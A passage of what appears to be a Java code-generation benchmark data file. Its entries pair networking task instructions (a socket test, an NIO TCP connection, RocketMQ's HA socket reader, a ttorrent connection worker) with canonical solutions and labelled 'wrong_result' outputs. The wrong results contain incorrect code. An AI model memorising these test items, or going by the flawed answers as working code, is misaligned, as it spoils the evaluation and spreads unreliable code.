    "Canonical_solution": "import java.net.Socket;\n\npublic void doSocketTest() throws Exception {\n    Socket socket = new Socket(\"localhost\", SERVER_SOCKET_PORT);\n    byte[] encoded = EventsHelper.generateJsonMeasurementsMessage(HARDWARE_ID);\n    socket.getOutputStream().write(encoded);\n    socket.getOutputStream().flush();\n    socket.getOutputStream().close();\n    socket.close();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.Socket;\nimport java.util.Date;\n\npublic class SocketTest {\n\n    private static final int SERVER_SOCKET_PORT = 12345;\n    private static final String HARDWARE_ID = \"HW123\";\n\n    public void doSocketTest() throws Exception {\n        try (Socket socket = new Socket(\"localhost\", SERVER_SOCKET_PORT)) {\n            MeasurementData data = new MeasurementData(HARDWARE_ID, new Date().getTime(), Math.random() * 100);\n            String json = data.toJson();\n\n            try (OutputStream outputStream = socket.getOutputStream();\n                 OutputStreamWriter writer = new OutputStreamWriter(outputStream)) {\n                writer.write(json);\n                writer.flush();\n            }\n        }\n    }\n\n    private static class MeasurementData {\n        String hardwareId;\n        long timestamp;\n        double value;\n\n        MeasurementData(String hardwareId, long timestamp, double value) {\n            this.hardwareId = hardwareId;\n            this.timestamp = timestamp;\n            this.value = value;\n        }\n\n        String toJson() {\n            return String.format(\"{\\\"hardwareId\\\":\\\"%s\\\",\\\"timestamp\\\":%d,\\\"value\\\":%.2f}\", hardwareId, timestamp, value);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 427,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Java NIO (Non-blocking I/O) for efficient network communication. The class should handle connection establishment, data transmission, and connection termination while managing network buffers and packet processing.\n\nClass Description: TCPConnection is a non-blocking TCP client implementation that extends an abstract connection class and implements a packet source interface. It manages socket communication, handles I/O operations asynchronously, and processes network packets with proper flow control.\n\nAttributes:\n- MTU: [int] - Maximum Transmission Unit size (16384 bytes)\n- MAX_PAYLOAD_SIZE: [int] - Maximum payload size after accounting for protocol headers\n- clientToNetwork: [StreamBuffer] - Buffer for data being sent from client to network\n- networkToClient: [Packetizer] - Handles packetization of incoming data\n- packetForClient: [IPv4Packet] - Current packet being processed for the client\n- channel: [SocketChannel] - NIO channel for TCP communication\n- selectionKey: [SelectionKey] - Registration key with the selector\n- interests: [int] - Current interest set for the selection key\n\nMethods:\n- TCPConnection([ConnectionId id, Client client, Selector selector, IPv4Header ipv4Header, TCPHeader tcpHeader]) -> [void] - Constructor that initializes the connection with necessary headers and registers the channel with the selector\n- disconnect() -> [void] - Closes the connection and releases resources\n- processReceive() -> [void] - Handles incoming data from the network when readable\n- processSend() -> [void] - Handles outgoing data to the network when writable\n- createChannel() -> [SocketChannel] - Creates and configures the socket channel\n- sendToNetwork([IPv4Packet packet]) -> [void] - Sends a packet to the network\n- updateInterests() -> [void] - Updates the selector's interest ops based on current state\n- mayRead() -> [boolean] - Determines if the channel should be registered for read operations\n- mayWrite() -> [boolean] - Determines if the channel should be registered for write operations\n- mayConnect() -> [boolean] - Determines if the channel is in connecting state",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\n\npublic class TCPConnection extends AbstractConnection implements PacketSource {\n\n    private static final int MTU = 0x4000;\n    private static final int MAX_PAYLOAD_SIZE = MTU - 20 - 20;\n\n    private final StreamBuffer clientToNetwork = new StreamBuffer(4 * IPv4Packet.MAX_PACKET_LENGTH);\n    private final Packetizer networkToClient;\n    private IPv4Packet packetForClient;\n\n    private final SocketChannel channel;\n    private final SelectionKey selectionKey;\n    private int interests;\n\n    public TCPConnection(ConnectionId id, Client client, Selector selector, IPv4Header ipv4Header, TCPHeader tcpHeader) throws IOException {\n        super(id, client);\n\n        TCPHeader shrinkedTcpHeader = tcpHeader.copy();\n        shrinkedTcpHeader.shrinkOptions();\n\n        networkToClient = new Packetizer(ipv4Header, shrinkedTcpHeader);\n        networkToClient.getResponseIPv4Header().swapSourceAndDestination();\n        networkToClient.getResponseTransportHeader().swapSourceAndDestination();\n\n        SelectionHandler selectionHandler = (selectionKey) -> {\n            if (selectionKey.isValid() && selectionKey.isConnectable()) {\n                processConnect();\n            }\n            if (selectionKey.isValid() && selectionKey.isReadable()) {\n                processReceive();\n            }\n            if (selectionKey.isValid() && selectionKey.isWritable()) {\n                processSend();\n            }\n            updateInterests();\n        };\n        channel = createChannel();\n        interests = SelectionKey.OP_CONNECT;\n        selectionKey = channel.register(selector, interests, selectionHandler);\n    }\n\n    @Override\n    public void disconnect() {\n        selectionKey.cancel();\n        try {\n            channel.close();\n        } catch (IOException e) {\n        }\n    }\n\n    private void processReceive() {\n        try {\n            assert packetForClient == null;\n            int remainingClientWindow = getRemainingClientWindow();\n            assert remainingClientWindow > 0;\n            int maxPayloadSize = Math.min(remainingClientWindow, MAX_PAYLOAD_SIZE);\n            updateHeaders(TCPHeader.FLAG_ACK | TCPHeader.FLAG_PSH);\n            packetForClient = networkToClient.packetize(channel, maxPayloadSize);\n            if (packetForClient == null) {\n                eof();\n                return;\n            }\n            consume(this);\n        } catch (IOException e) {\n            resetConnection();\n        }\n    }\n\n    private void processSend() {\n        try {\n            int w = clientToNetwork.writeTo(channel);\n            if (w > 0) {\n                acknowledgementNumber += w;\n\n                if (finReceived && clientToNetwork.isEmpty()) {\n                    doHandleFin();\n                } else {\n                    sendEmptyPacketToClient(TCPHeader.FLAG_ACK);\n                }\n            } else {\n                close();\n            }\n        } catch (IOException e) {\n            resetConnection();\n        }\n    }\n\n    private SocketChannel createChannel() throws IOException {\n        SocketChannel socketChannel = SocketChannel.open();\n        socketChannel.configureBlocking(false);\n        socketChannel.connect(getRewrittenDestination());\n        return socketChannel;\n    }\n\n    @Override\n    public void sendToNetwork(IPv4Packet packet) {\n        handlePacket(packet);\n        updateInterests();\n    }\n\n    protected void updateInterests() {\n        if (!selectionKey.isValid()) {\n            return;\n        }\n        int interestOps = 0;\n        if (mayRead()) {\n            interestOps |= SelectionKey.OP_READ;\n        }\n        if (mayWrite()) {\n            interestOps |= SelectionKey.OP_WRITE;\n        }\n        if (mayConnect()) {\n            interestOps |= SelectionKey.OP_CONNECT;\n        }\n        if (interests != interestOps) {\n            interests = interestOps;\n            selectionKey.interestOps(interestOps);\n        }\n    }\n\n    private boolean mayRead() {\n        if (!state.isConnected() || state.isClosed()) {\n            return false;\n        }\n        if (packetForClient != null) {\n            return false;\n        }\n        return getRemainingClientWindow() > 0;\n    }\n\n    private boolean mayWrite() {\n        return !clientToNetwork.isEmpty();\n    }\n\n    private boolean mayConnect() {\n        return state == State.SYN_SENT;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\n\npublic class TCPConnection extends AbstractConnection implements IPacketSource {\n    public static final int MTU = 16384;\n    public static final int MAX_PAYLOAD_SIZE = MTU - 40; // Assuming IPv4 + TCP headers\n\n    private StreamBuffer clientToNetwork;\n    private Packetizer networkToClient;\n    private IPv4Packet packetForClient;\n    private SocketChannel channel;\n    private SelectionKey selectionKey;\n    private int interests;\n\n    public TCPConnection(ConnectionId id, Client client, Selector selector, IPv4Header ipv4Header, TCPHeader tcpHeader) throws IOException {\n        super(id, client);\n        this.clientToNetwork = new StreamBuffer(MTU);\n        this.networkToClient = new Packetizer(MAX_PAYLOAD_SIZE);\n        this.packetForClient = new IPv4Packet();\n        this.channel = createChannel();\n        this.selectionKey = channel.register(selector, 0);\n        configureHeaders(ipv4Header, tcpHeader);\n        updateInterests();\n    }\n\n    public void disconnect() {\n        try {\n            if (channel.isOpen()) {\n                channel.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void processReceive() {\n        try {\n            int bytesRead = channel.read(networkToClient.getBuffer());\n            if (bytesRead > 0) {\n                networkToClient.flip();\n                while (networkToClient.hasData()) {\n                    if (networkToClient.next(packetForClient)) {\n                        deliverPacket(packetForClient);\n                    }\n                }\n                networkToClient.compact();\n            } else if (bytesRead == -1) {\n                disconnect();\n            }\n        } catch (IOException e) {\n            disconnect();\n        }\n    }\n\n    public void processSend() {\n        try {\n            if (clientToNetwork.hasRemaining()) {\n                int bytesWritten = channel.write(clientToNetwork.getBuffer());\n                if (bytesWritten > 0) {\n                    clientToNetwork.compact();\n                }\n            } else {\n                clientToNetwork.clear();\n            }\n        } catch (IOException e) {\n            disconnect();\n        }\n    }\n\n    protected SocketChannel createChannel() throws IOException {\n        SocketChannel channel = SocketChannel.open();\n        channel.configureBlocking(false);\n        return channel;\n    }\n\n    public void sendToNetwork(IPv4Packet packet) {\n        try {\n            clientToNetwork.put(packet.getBuffer());\n            updateInterests();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void updateInterests() {\n        int ops = 0;\n        if (mayRead()) {\n            ops |= SelectionKey.OP_READ;\n        }\n        if (mayWrite()) {\n            ops |= SelectionKey.OP_WRITE;\n        }\n        if (mayConnect()) {\n            ops |= SelectionKey.OP_CONNECT;\n        }\n        if (selectionKey.interestOps() != ops) {\n            selectionKey.interestOps(ops);\n        }\n    }\n\n    public boolean mayRead() {\n        return !networkToClient.isFull();\n    }\n\n    public boolean mayWrite() {\n        return clientToNetwork.hasRemaining();\n    }\n\n    public boolean mayConnect() {\n        return !channel.finishConnect();\n    }\n}\n```"
  },
  {
    "Task_id": 429,
    "Instruction": "Task Description: Implement a Java class that handles reading data from a SocketChannel using Java NIO (Non-blocking I/O) for high-availability (HA) communication in a distributed messaging system.\n\nClass Description: ReadSocketService is a service thread that continuously reads data from a SocketChannel using a Selector and ByteBuffer. It processes incoming HA protocol messages (handshake and transfer states) and manages connection state. The class integrates with a high-availability service to maintain synchronization between master and slave nodes.\n\nAttributes:\n- READ_MAX_BUFFER_SIZE: [int] - Constant defining the maximum buffer size for reading (1MB)\n- selector: [Selector] - NIO Selector for monitoring the SocketChannel\n- socketChannel: [SocketChannel] - The channel for communication with the remote peer\n- byteBufferRead: [ByteBuffer] - Buffer for storing read data\n- haReader: [AbstractHAReader] - Reader implementation for processing HA protocol messages\n- processPosition: [int] - Current processing position within the read buffer\n- lastReadTimestamp: [long] - Timestamp of last successful read operation\n\nMethods:\n- ReadSocketService([SocketChannel socketChannel]) -> [void] - Constructor that initializes the selector, configures the socket channel, and sets up the HA reader\n- run() -> [void] - Main service loop that performs selector operations, reads data, and handles connection state\n- getServiceName() -> [String] - Returns the service name with broker identifier if in container mode\n- HAServerReader.processReadResult([ByteBuffer byteBufferRead]) -> [boolean] - Processes the read buffer according to HA protocol (handshake and transfer states), returns true if processing succeeds\n\nThe class should handle connection timeouts, buffer management (including compaction), and proper resource cleanup when stopping. It should integrate with a parent HA connection service for state management and notification.",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport org.apache.rocketmq.common.ServiceThread;\nimport org.apache.rocketmq.common.utils.NetworkUtil;\nimport org.apache.rocketmq.logging.org.slf4j.Logger;\nimport org.apache.rocketmq.logging.org.slf4j.LoggerFactory;\nimport org.apache.rocketmq.store.ha.io.AbstractHAReader;\nimport org.apache.rocketmq.store.ha.io.HAWriter;\n\nclass ReadSocketService extends ServiceThread {\n    private static final int READ_MAX_BUFFER_SIZE = 1024 * 1024;\n    private final Selector selector;\n    private final SocketChannel socketChannel;\n    private final ByteBuffer byteBufferRead = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n    private final AbstractHAReader haReader;\n    private int processPosition = 0;\n    private volatile long lastReadTimestamp = System.currentTimeMillis();\n\n    public ReadSocketService(final SocketChannel socketChannel) throws IOException {\n        this.selector = NetworkUtil.openSelector();\n        this.socketChannel = socketChannel;\n        this.socketChannel.register(this.selector, SelectionKey.OP_READ);\n        this.setDaemon(true);\n        haReader = new HAServerReader();\n        haReader.registerHook(readSize -> {\n            if (readSize > 0) {\n                ReadSocketService.this.lastReadTimestamp =\n                    haService.getDefaultMessageStore().getSystemClock().now();\n            }\n        });\n    }\n\n    @Override\n    public void run() {\n        LOGGER.info(this.getServiceName() + \" service started\");\n\n        while (!this.isStopped()) {\n            try {\n                this.selector.select(1000);\n                boolean ok = this.haReader.read(this.socketChannel, this.byteBufferRead);\n                if (!ok) {\n                    AutoSwitchHAConnection.LOGGER.error(\"processReadEvent error\");\n                    break;\n                }\n\n                long interval = haService.getDefaultMessageStore().getSystemClock().now() - this.lastReadTimestamp;\n                if (interval > haService.getDefaultMessageStore().getMessageStoreConfig().getHaHousekeepingInterval()) {\n                    LOGGER.warn(\"ha housekeeping, found this connection[\" + clientAddress + \"] expired, \" + interval);\n                    break;\n                }\n            } catch (Exception e) {\n                AutoSwitchHAConnection.LOGGER.error(this.getServiceName() + \" service has exception.\", e);\n                break;\n            }\n        }\n\n        this.makeStop();\n\n        changeCurrentState(HAConnectionState.SHUTDOWN);\n\n        writeSocketService.makeStop();\n\n        haService.removeConnection(AutoSwitchHAConnection.this);\n\n        haService.getConnectionCount().decrementAndGet();\n\n        SelectionKey sk = this.socketChannel.keyFor(this.selector);\n        if (sk != null) {\n            sk.cancel();\n        }\n\n        try {\n            this.selector.close();\n            this.socketChannel.close();\n        } catch (IOException e) {\n            AutoSwitchHAConnection.LOGGER.error(\"\", e);\n        }\n\n        flowMonitor.shutdown(true);\n\n        AutoSwitchHAConnection.LOGGER.info(this.getServiceName() + \" service end\");\n    }\n\n    @Override\n    public String getServiceName() {\n        if (haService.getDefaultMessageStore().getBrokerConfig().isInBrokerContainer()) {\n            return haService.getDefaultMessageStore().getBrokerIdentity().getIdentifier() + ReadSocketService.class.getSimpleName();\n        }\n        return ReadSocketService.class.getSimpleName();\n    }\n\n    class HAServerReader extends AbstractHAReader {\n        @Override\n        protected boolean processReadResult(ByteBuffer byteBufferRead) {\n            while (true) {\n                boolean processSuccess = true;\n                int readSocketPos = byteBufferRead.position();\n                int diff = byteBufferRead.position() - ReadSocketService.this.processPosition;\n                if (diff >= AutoSwitchHAClient.MIN_HEADER_SIZE) {\n                    int readPosition = ReadSocketService.this.processPosition;\n                    HAConnectionState slaveState = HAConnectionState.values()[byteBufferRead.getInt(readPosition)];\n\n                    switch (slaveState) {\n                        case HANDSHAKE:\n                            Long slaveBrokerId = byteBufferRead.getLong(readPosition + AutoSwitchHAClient.HANDSHAKE_HEADER_SIZE - 8);\n                            AutoSwitchHAConnection.this.slaveId = slaveBrokerId;\n                            short syncFromLastFileFlag = byteBufferRead.getShort(readPosition + AutoSwitchHAClient.HANDSHAKE_HEADER_SIZE - 12);\n                            if (syncFromLastFileFlag == 1) {\n                                AutoSwitchHAConnection.this.isSyncFromLastFile = true;\n                            }\n                            short isAsyncLearner = byteBufferRead.getShort(readPosition + AutoSwitchHAClient.HANDSHAKE_HEADER_SIZE - 10);\n                            if (isAsyncLearner == 1) {\n                                AutoSwitchHAConnection.this.isAsyncLearner = true;\n                            }\n\n                            isSlaveSendHandshake = true;\n                            byteBufferRead.position(readSocketPos);\n                            ReadSocketService.this.processPosition += AutoSwitchHAClient.HANDSHAKE_HEADER_SIZE;\n                            LOGGER.info(\"Receive slave handshake, slaveBrokerId:{}, isSyncFromLastFile:{}, isAsyncLearner:{}\",\n                                AutoSwitchHAConnection.this.slaveId, AutoSwitchHAConnection.this.isSyncFromLastFile, AutoSwitchHAConnection.this.isAsyncLearner);\n                            break;\n                        case TRANSFER:\n                            long slaveMaxOffset = byteBufferRead.getLong(readPosition + 4);\n                            ReadSocketService.this.processPosition += AutoSwitchHAClient.TRANSFER_HEADER_SIZE;\n\n                            AutoSwitchHAConnection.this.slaveAckOffset = slaveMaxOffset;\n                            if (slaveRequestOffset < 0) {\n                                slaveRequestOffset = slaveMaxOffset;\n                            }\n                            byteBufferRead.position(readSocketPos);\n                            maybeExpandInSyncStateSet(slaveMaxOffset);\n                            AutoSwitchHAConnection.this.haService.updateConfirmOffsetWhenSlaveAck(AutoSwitchHAConnection.this.slaveId);\n                            AutoSwitchHAConnection.this.haService.notifyTransferSome(AutoSwitchHAConnection.this.slaveAckOffset);\n                            break;\n                        default:\n                            LOGGER.error(\"Current state illegal {}\", currentState);\n                            return false;\n                    }\n\n                    if (!slaveState.equals(currentState)) {\n                        LOGGER.warn(\"Master change state from {} to {}\", currentState, slaveState);\n                        changeCurrentState(slaveState);\n                    }\n                    if (processSuccess) {\n                        continue;\n                    }\n                }\n\n                if (!byteBufferRead.hasRemaining()) {\n                    byteBufferRead.position(ReadSocketService.this.processPosition);\n                    byteBufferRead.compact();\n                    ReadSocketService.this.processPosition = 0;\n                }\n                break;\n            }\n\n            return true;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "```java\npublic class ReadSocketService extends Thread {\n    private static final int READ_MAX_BUFFER_SIZE = 1024 * 1024;\n    private final Selector selector;\n    private final SocketChannel socketChannel;\n    private final ByteBuffer byteBufferRead;\n    private final AbstractHAReader haReader;\n    private int processPosition;\n    private long lastReadTimestamp;\n\n    public ReadSocketService(SocketChannel socketChannel) throws IOException {\n        this.selector = Selector.open();\n        this.socketChannel = socketChannel;\n        this.byteBufferRead = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n        this.haReader = new HAServerReader();\n        this.processPosition = 0;\n        this.lastReadTimestamp = System.currentTimeMillis();\n\n        socketChannel.configureBlocking(false);\n        socketChannel.register(selector, SelectionKey.OP_READ);\n    }\n\n    @Override\n    public void run() {\n        try {\n            while (!Thread.currentThread().isInterrupted()) {\n                if (selector.selectNow() == 0) {\n                    if (System.currentTimeMillis() - lastReadTimestamp > 30000) {\n                        handleConnectionTimeout();\n                        break;\n                    }\n                    continue;\n                }\n\n                for (SelectionKey key : selector.selectedKeys()) {\n                    if (!key.isValid()) {\n                        continue;\n                    }\n\n                    if (key.isReadable()) {\n                        int bytesRead = socketChannel.read(byteBufferRead);\n                        if (bytesRead == -1) {\n                            handleDisconnection();\n                            return;\n                        } else if (bytesRead > 0) {\n                            lastReadTimestamp = System.currentTimeMillis();\n                            byteBufferRead.flip();\n                            boolean success = haReader.processReadResult(byteBufferRead);\n                            byteBufferRead.compact();\n                            if (!success) {\n                                handleReadFailure();\n                            }\n                        }\n                    }\n                }\n                selector.selectedKeys().clear();\n            }\n        } catch (IOException e) {\n            handleIOException(e);\n        } finally {\n            cleanupResources();\n        }\n    }\n\n    public String getServiceName() {\n        return \"ReadSocketService\";\n    }\n\n    private void handleConnectionTimeout() {\n        System.out.println(\"Connection timeout detected. Closing channel.\");\n        cleanupResources();\n        Thread.currentThread().interrupt();\n    }\n\n    private void handleDisconnection() {\n        System.out.println(\"Remote peer disconnected.\");\n        cleanupResources();\n        Thread.currentThread().interrupt();\n    }\n\n    private void handleReadFailure() {\n        System.out.println(\"Failed to process read data.\");\n        cleanupResources();\n        Thread.currentThread().interrupt();\n    }\n\n    private void handleIOException(IOException e) {\n        System.err.println(\"I/O error occurred: \" + e.getMessage());\n        e.printStackTrace();\n        cleanupResources();\n        Thread.currentThread().interrupt();\n    }\n\n    private void cleanupResources() {\n        try {\n            if (socketChannel != null && socketChannel.isOpen()) {\n                socketChannel.close();\n            }\n            if (selector != null && selector.isOpen()) {\n                selector.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n\nclass HAServerReader extends AbstractHAReader {\n    @Override\n    public boolean processReadResult(ByteBuffer byteBufferRead) {\n        // Implement HA protocol processing logic here\n        // Example: parse handshake or transfer state messages\n        return true; // Return actual processing result based on implementation\n    }\n}\n\nabstract class AbstractHAReader {\n    public abstract boolean processReadResult(ByteBuffer byteBufferRead);\n}\n```"
  },
  {
    "Task_id": 435,
    "Instruction": "Task Description: Implement a Java class that manages TCP client connections using Java NIO (Non-blocking I/O) techniques, including connection establishment, data writing, and cleanup operations.\n\nClass Description: ConnectionWorker is a Runnable class that handles asynchronous TCP client connections using Java NIO. It manages connection tasks through a selector pattern, processes write operations, and performs periodic cleanup of stale connections. The class supports concurrent operations through queue-based task management.\n\nAttributes:\n- logger: Logger - SLF4J logger for logging operations\n- stop: boolean - Volatile flag to control thread execution\n- selector: Selector - NIO selector for managing channels\n- myConnectQueue: BlockingQueue<ConnectTask> - Queue for pending connection tasks\n- myWriteQueue: BlockingQueue<WriteTask> - Queue for pending write operations\n- mySemaphore: Semaphore - Controls access to the worker thread\n- myKeyProcessors: List<KeyProcessor> - Processors for handling different channel operations\n- myTimeService: TimeService - Provides time-related functionality\n- lastCleanupTime: long - Timestamp of last cleanup operation\n- mySelectorTimeoutMillis: int - Timeout for selector operations\n- myCleanupTimeoutMillis: long - Timeout between cleanup operations\n- myCleanupProcessor: CleanupProcessor - Handles connection cleanup\n- myNewConnectionAllower: NewConnectionAllower - Controls new connection allowance\n\nMethods:\n- run(): void - Main execution method implementing Runnable interface\n- connectToPeersFromQueue(): void - Processes pending connection tasks from queue\n- processSelectedKeys(): void - Processes all ready selection keys\n- processSelectedKey(SelectionKey): void - Processes a single selection key\n- offerConnect(ConnectTask, int, TimeUnit): boolean - Adds new connection task to queue\n- addTaskToQueue(T, int, TimeUnit, BlockingQueue<T>): boolean - Generic method for adding tasks to queues\n- processWriteTasks(): void - Processes pending write operations (implied from code context)\n- cleanup(): void - Performs cleanup operations (implied from code context)\n- needRunCleanup(): boolean - Determines if cleanup is needed (implied from code context)",
    "Canonical_solution": "import com.turn.ttorrent.common.LoggerUtils;\nimport com.turn.ttorrent.common.TimeService;\nimport com.turn.ttorrent.common.TorrentLoggerFactory;\nimport com.turn.ttorrent.network.keyProcessors.CleanupProcessor;\nimport com.turn.ttorrent.network.keyProcessors.KeyProcessor;\nimport org.slf4j.Logger;\n\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.*;\nimport java.util.Iterator;\nimport java.util.List;\nimport java.util.Set;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.concurrent.Semaphore;\nimport java.util.concurrent.TimeUnit;\n\npublic class ConnectionWorker implements Runnable {\n\n  private static final Logger logger = TorrentLoggerFactory.getLogger(ConnectionWorker.class);\n  private static final String SELECTOR_THREAD_NAME = \"Torrent channels manager thread\";\n  private volatile boolean stop = false;\n  private final Selector selector;\n  private final BlockingQueue<ConnectTask> myConnectQueue;\n  private final BlockingQueue<WriteTask> myWriteQueue;\n  private final Semaphore mySemaphore;\n  private final List<KeyProcessor> myKeyProcessors;\n  private final TimeService myTimeService;\n  private long lastCleanupTime;\n  private volatile int mySelectorTimeoutMillis;\n  private volatile long myCleanupTimeoutMillis;\n  private final CleanupProcessor myCleanupProcessor;\n  private final NewConnectionAllower myNewConnectionAllower;\n\n  public ConnectionWorker(Selector selector,\n                   List<KeyProcessor> keyProcessors,\n                   int selectorTimeoutMillis,\n                   int cleanupTimeoutMillis,\n                   TimeService timeService,\n                   CleanupProcessor cleanupProcessor,\n                   NewConnectionAllower myNewConnectionAllower) {\n    this.selector = selector;\n    this.myTimeService = timeService;\n    this.lastCleanupTime = timeService.now();\n    this.mySelectorTimeoutMillis = selectorTimeoutMillis;\n    this.myCleanupTimeoutMillis = cleanupTimeoutMillis;\n    this.myCleanupProcessor = cleanupProcessor;\n    this.myNewConnectionAllower = myNewConnectionAllower;\n    this.mySemaphore = new Semaphore(1);\n    this.myConnectQueue = new LinkedBlockingQueue<ConnectTask>(100);\n    this.myKeyProcessors = keyProcessors;\n    this.myWriteQueue = new LinkedBlockingQueue<WriteTask>(5000);\n  }\n\n  @Override\n  public void run() {\n    try {\n      mySemaphore.acquire();\n    } catch (InterruptedException e) {\n      return;\n    }\n\n    final String oldName = Thread.currentThread().getName();\n\n    try {\n      Thread.currentThread().setName(SELECTOR_THREAD_NAME);\n\n      while (!stop && (!Thread.currentThread().isInterrupted())) {\n        try {\n          logger.trace(\"try select keys from selector\");\n          int selected;\n          try {\n            selected = selector.select(mySelectorTimeoutMillis);\n          } catch (ClosedSelectorException e) {\n            break;\n          }\n          connectToPeersFromQueue();\n          processWriteTasks();\n          logger.trace(\"select keys from selector. Keys count is \" + selected);\n          if (selected != 0) {\n            processSelectedKeys();\n          }\n          if (needRunCleanup()) {\n            cleanup();\n          }\n        } catch (Throwable e) {\n          LoggerUtils.warnAndDebugDetails(logger, \"unable to select channel keys. Error message {}\", e.getMessage(), e);\n        }\n      }\n    } catch (Throwable e) {\n      LoggerUtils.errorAndDebugDetails(logger, \"exception on cycle iteration\", e);\n    } finally {\n      Thread.currentThread().setName(oldName);\n      mySemaphore.release();\n    }\n  }\n\n  private void connectToPeersFromQueue() {\n    ConnectTask connectTask;\n    while ((connectTask = myConnectQueue.poll()) != null) {\n      if (stop || Thread.currentThread().isInterrupted()) {\n        return;\n      }\n      logger.debug(\"try connect to peer. Connect task is {}\", connectTask);\n      try {\n        SocketChannel socketChannel = SocketChannel.open();\n        socketChannel.configureBlocking(false);\n        socketChannel.register(selector, SelectionKey.OP_CONNECT, connectTask);\n        socketChannel.connect(new InetSocketAddress(connectTask.getHost(), connectTask.getPort()));\n      } catch (IOException e) {\n        LoggerUtils.warnAndDebugDetails(logger, \"unable connect. Connect task is {}\", connectTask, e);\n      }\n    }\n  }\n\n  private void processSelectedKeys() {\n    Set<SelectionKey> selectionKeys = selector.selectedKeys();\n    for (SelectionKey key : selectionKeys) {\n      if (stop || Thread.currentThread().isInterrupted()) {\n        return;\n      }\n      try {\n        processSelectedKey(key);\n      } catch (Exception e) {\n        logger.warn(\"error {} in processing key. Close channel {}\", e.getMessage(), key.channel());\n        logger.debug(\"\", e);\n        try {\n          key.channel().close();\n        } catch (IOException ioe) {\n          LoggerUtils.errorAndDebugDetails(logger, \"unable close bad channel\", ioe);\n        }\n      }\n    }\n    selectionKeys.clear();\n  }\n\n  private void processSelectedKey(SelectionKey key) throws IOException {\n    logger.trace(\"try process key for channel {}\", key.channel());\n    myCleanupProcessor.processSelected(key);\n    if (!key.channel().isOpen()) {\n      key.cancel();\n      return;\n    }\n    for (KeyProcessor keyProcessor : myKeyProcessors) {\n      if (keyProcessor.accept(key)) {\n        keyProcessor.process(key);\n      }\n    }\n  }\n\n  public boolean offerConnect(ConnectTask connectTask, int timeout, TimeUnit timeUnit) {\n    if (!myNewConnectionAllower.isNewConnectionAllowed()) {\n      logger.info(\"can not add connect task {} to queue. New connection is not allowed\", connectTask);\n      return false;\n    }\n    return addTaskToQueue(connectTask, timeout, timeUnit, myConnectQueue);\n  }\n\n  private <T> boolean addTaskToQueue(T task, int timeout, TimeUnit timeUnit, BlockingQueue<T> queue) {\n    try {\n      if (queue.offer(task, timeout, timeUnit)) {\n        logger.trace(\"added task {}. Wake up selector\", task);\n        selector.wakeup();\n        return true;\n      }\n    } catch (InterruptedException e) {\n      logger.debug(\"Task {} interrupted before was added to queue\", task);\n    }\n    logger.debug(\"Task {} was not added\", task);\n    return false;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.*;\nimport java.util.Iterator;\nimport java.util.List;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.Semaphore;\nimport java.util.concurrent.TimeUnit;\nimport org.slf4j.Logger;\n\npublic class ConnectionWorker implements Runnable {\n    private final Logger logger;\n    private volatile boolean stop;\n    private final Selector selector;\n    private final BlockingQueue<ConnectTask> myConnectQueue;\n    private final BlockingQueue<WriteTask> myWriteQueue;\n    private final Semaphore mySemaphore;\n    private final List<KeyProcessor> myKeyProcessors;\n    private final TimeService myTimeService;\n    private long lastCleanupTime;\n    private final int mySelectorTimeoutMillis;\n    private final long myCleanupTimeoutMillis;\n    private final CleanupProcessor myCleanupProcessor;\n    private final NewConnectionAllower myNewConnectionAllower;\n\n    public ConnectionWorker(Logger logger, Selector selector, BlockingQueue<ConnectTask> connectQueue,\n                            BlockingQueue<WriteTask> writeQueue, Semaphore semaphore,\n                            List<KeyProcessor> keyProcessors, TimeService timeService,\n                            int selectorTimeoutMillis, long cleanupTimeoutMillis,\n                            CleanupProcessor cleanupProcessor, NewConnectionAllower newConnectionAllower) throws IOException {\n        this.logger = logger;\n        this.stop = false;\n        this.selector = selector;\n        this.myConnectQueue = connectQueue;\n        this.myWriteQueue = writeQueue;\n        this.mySemaphore = semaphore;\n        this.myKeyProcessors = keyProcessors;\n        this.myTimeService = timeService;\n        this.mySelectorTimeoutMillis = selectorTimeoutMillis;\n        this.myCleanupTimeoutMillis = cleanupTimeoutMillis;\n        this.myCleanupProcessor = cleanupProcessor;\n        this.myNewConnectionAllower = newConnectionAllower;\n        this.lastCleanupTime = myTimeService.currentTimeMillis();\n    }\n\n    @Override\n    public void run() {\n        try {\n            while (!stop) {\n                connectToPeersFromQueue();\n                processSelectedKeys();\n                processWriteTasks();\n                if (needRunCleanup()) {\n                    cleanup();\n                }\n                mySemaphore.acquire();\n            }\n        } catch (IOException | InterruptedException e) {\n            logger.error(\"Error in ConnectionWorker\", e);\n        } finally {\n            try {\n                selector.close();\n            } catch (IOException e) {\n                logger.warn(\"Failed to close selector\", e);\n            }\n        }\n    }\n\n    private void connectToPeersFromQueue() {\n        ConnectTask task;\n        while ((task = myConnectQueue.poll()) != null) {\n            try {\n                SocketChannel socketChannel = SocketChannel.open();\n                socketChannel.configureBlocking(false);\n                socketChannel.connect(new InetSocketAddress(task.getHost(), task.getPort()));\n                SelectionKey key = socketChannel.register(selector, 